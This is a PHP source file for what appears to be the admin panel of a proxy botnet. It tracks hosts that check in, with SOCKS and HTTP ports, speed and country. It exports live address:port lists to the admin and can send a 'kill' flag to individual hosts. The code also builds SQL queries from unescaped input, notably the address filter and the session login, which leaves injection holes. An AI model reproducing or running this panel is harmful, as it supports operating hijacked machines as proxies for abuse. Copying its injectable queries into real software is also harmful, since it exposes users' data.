<?

require_once "common.php";

if (isset($_GET['logout']))
{
      logout();
} elseif (isset($_POST['login']) && isset($_POST['pass']))
{
      $errmsg = auth(addslashes($_POST['login']), addslashes($_POST['pass']));
      $smarty->assign("errmsg", $errmsg);
}
elseif (isset($_GET['getlist']))
{
      if (!check_auth() || !isset($_SESSION['admin']))
      {
           logout();
           header("location: index.php");
      }

      if ($_GET['getlist'] == 1)
           $p = 'sport';
      elseif ($_GET['getlist'] == 2)
           $p = 'hport';
      else
           header("location: index.php");

      header("Content-type: text/plain");

      $sql = "SELECT * FROM `stat` WHERE `kill`='0' AND ".time()."-`last_request`<".($opt['request_timeout']*60)." AND `ping`>0 ORDER BY `last_request` DESC";
      $r = db_query($sql);
      while ($f = mysql_fetch_array($r))
           echo "{$f['addr']}:{$f[$p]}\n";
      exit;
}
elseif (isset($_GET['kill']) && isset($_SESSION['admin']))
{
      $id = addslashes($_GET['kill']);
      $sql = "UPDATE `stat` SET `kill`='1' WHERE `id`='$id'";
      db_query($sql);
      header("location: index.php");
}

if (!check_auth())
      $smarty->assign("notauth", true);

if (isset($_SESSION['admin']))
{
      $smarty->assign("admin", true);
      $userinfo['login'] = $_SESSION['login'];
} else {
      $sql = "SELECT *
              FROM `users`
              WHERE `login`='{$_SESSION['login']}'
      ";
      $userinfo = mysql_fetch_array(db_query($sql));
}

$smarty->assign("time", time());
$smarty->assign("userinfo", $userinfo);

$orderby = 'ping';
$fsql = '';

$where[] = "`kill`='0' AND ".time()."-`last_request`<".($opt['request_timeout']*60*2)." AND `ping`>0";

$flt = array();
if (isset($_POST['flt']))
    $flt = $_SESSION['flt'] = $_POST['flt'];
elseif (isset($_SESSION['flt']))
    $flt = $_SESSION['flt'];

if (isset($flt))
{
        if (isset($flt['country']))
        {
               foreach (array_keys($flt['country']) as $cn)
                     $flt['country'][$cn] = "'".addslashes($flt['country'][$cn])."'";
               $where[] = "`country` IN(".implode(",", $flt['country']).")";
        }
        if (isset($flt['city']) && !empty($flt['city']))
        {
               $where[] = "`city` LIKE '%".addslashes($flt['city'])."%'";
        }
        if (isset($flt['region']) && !empty($flt['region']))
        {
               $where[] = "`region` LIKE '%".addslashes($flt['region'])."%'";
        }
        if (isset($flt['speed_from']) && !empty($flt['speed_from']))
        {
               $where[] = "`speed`>'".(intval($flt['speed_from'])*1000)."'";
        }
        if (isset($flt['speed_to']) && !empty($flt['speed_to']))
        {
               $where[] = "`speed`<'".(intval($flt['speed_to'])*1000)."'";
        }
        if (isset($flt['addr']) && !empty($flt['addr']))
        {
               $where[] = "`addr` LIKE '".str_replace("*", "%", $flt['addr'])."'";
        }

        if (isset($where))
        $fsql .= "WHERE ".implode(" AND ", $where);

        if (isset($flt['order']) && !empty($flt['order']))
        {
               switch ($flt['order'])
               {
                      case '1':
                      $orderby = 'speed';
                      break;

                      case '2':
                      $orderby = 'country';
                      break;

                      case '3':
                      $orderby = 'last_request';
                      break;
               }
        }

        $smarty->assign("flt", $flt);
}

$sql = "SELECT * FROM `stat` WHERE ".time()."-`last_request`<".($opt['request_timeout']*60*2)." AND `ping`>0 AND `kill`='0'";
$r = db_query($sql);

$countries = array();
while ($f = mysql_fetch_array($r))
{
      if (!isset($countries[$f['country']]))
      {
             $countries[$f['country']]['num'] = 1;
             $countries[$f['country']]['name'] = $f['country_full'];
             $countries[$f['country']]['code'] = $f['country'];
             $flag = "flags/".strtolower($f['country']).".gif";
             if (file_exists($flag))
                  $countries[$f['country']]['flag'] = $flag;
             else $countries[$f['country']]['flag'] = "flags/00.gif";
             if (isset($flt['country'][$f['country']]))
                  $countries[$f['country']]['checked'] = true;
      } else $countries[$f['country']]['num']++;
}

$cntr = array();
foreach ($countries as $c)
      $cntr[] = $c;

$smarty->assign("countries", $cntr);

$page = intval(@$_GET['page']);

$sql = "SELECT * FROM `stat`
        $fsql
        ORDER BY `$orderby`
";

$r = db_query($sql);

$tot = mysql_num_rows($r);

$sql .= " LIMIT ".($page*$opt['items_on_page']).", {$opt['items_on_page']}";
$r = db_query($sql);

$proxies = array();
while ($f = mysql_fetch_array($r))
{
      $flag = "flags/".strtolower($f['country']).".gif";
      if (file_exists($flag))
           $f['flag'] = $flag;
      else $f['flag'] = "flags/00.gif";
      $f['speed'] = sprintf("%02.2f", $f['speed'] / 1000);
      $proxies[] = $f;
}

if (!empty($proxies))
{
      $smarty->assign("proxies", $proxies);
      $smarty->assign("total_proxies", $tot);

      if ($tot > $opt['items_on_page'])
      {
            $p = "<br>Pages: ";

            for ($i = 0; $i < ceil(($tot) / $opt['items_on_page']); $i++)
            {
                  if ($i == $page)
                        $p .= "<b>".($i+1)."</b> ";
                  else  $p .= "<a href='index.php?page=$i'>".($i+1)."</a> ";
            }

            $smarty->assign("pages", $p);
      }
}

$smarty->assign("tpl", "main.tpl");
$smarty->display("index.tpl");

?>